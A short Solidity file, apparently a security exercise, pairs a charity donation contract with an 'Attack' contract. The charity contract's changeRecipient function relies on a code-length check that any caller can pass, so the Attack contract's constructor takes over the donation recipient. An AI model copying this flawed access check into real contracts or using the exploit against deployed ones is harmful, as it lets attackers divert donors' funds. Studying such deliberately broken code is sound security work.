// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract CharityCampaign {
    address public recepient;
    constructor() {
        recepient = msg.sender;
    }

    mapping (address => bytes32) public admins;

    function makeAdmin(address _admin) external {
        require(msg.sender==recepient||admins[msg.sender]==keccak256("ADMIN"), "Access denied");
        admins[_admin] = keccak256("ADMIN");
    }

    function donate() external payable{
        (bool sent,) = payable(recepient).call{value: msg.value}("");
        require(sent, "donation failed");
    }

    function changeRecipient(address _recepient) external {
        require(msg.sender.code.length==0 || admins[msg.sender]==keccak256("ADMIN") || msg.sender==recepient, "Access denied");
        recepient = _recepient;
    }
}

contract Attack {
    constructor(CharityCampaign target) {
        target.changeRecipient(msg.sender);
    }
}